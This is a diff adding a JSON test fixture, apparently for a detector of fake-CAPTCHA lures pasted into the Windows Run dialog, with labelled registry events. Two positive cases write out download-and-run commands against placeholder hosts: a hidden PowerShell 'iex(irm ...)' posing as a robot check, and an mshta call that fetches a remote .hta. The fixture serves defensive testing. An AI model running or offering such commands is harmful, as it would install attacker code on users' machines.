@@ -1,0 +1,12 @@
+[
+  {"note": "Fake CAPTCHA lure pasted into Run",
+   "event": {"TargetObject": "HKU\\S-1-5-21-1004336348-1177238915-682003330-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\a", "Details": "powershell -w h -c \"iex(irm https://check.example.invalid)\" # I am not a robot - Verification ID 8841\\1"}, "expected": true},
+  {"note": "mshta lure",
+   "event": {"TargetObject": "HKU\\S-1-5-21-1004336348-1177238915-682003330-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\b", "Details": "mshta https://cdn.example.invalid/verify.hta\\1"}, "expected": true},
+  {"note": "Normal Run dialog use",
+   "event": {"TargetObject": "HKU\\S-1-5-21-1004336348-1177238915-682003330-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\c", "Details": "notepad\\1"}, "expected": false},
+  {"note": "Opening a network share",
+   "event": {"TargetObject": "HKU\\S-1-5-21-1004336348-1177238915-682003330-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU\\d", "Details": "\\\\fileserver\\finance\\1"}, "expected": false},
+  {"note": "PowerShell string written to an unrelated key",
+   "event": {"TargetObject": "HKU\\S-1-5-21-1004336348-1177238915-682003330-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", "Details": "powershell -w hidden -File C:\\ProgramData\\u.ps1"}, "expected": false}
+]
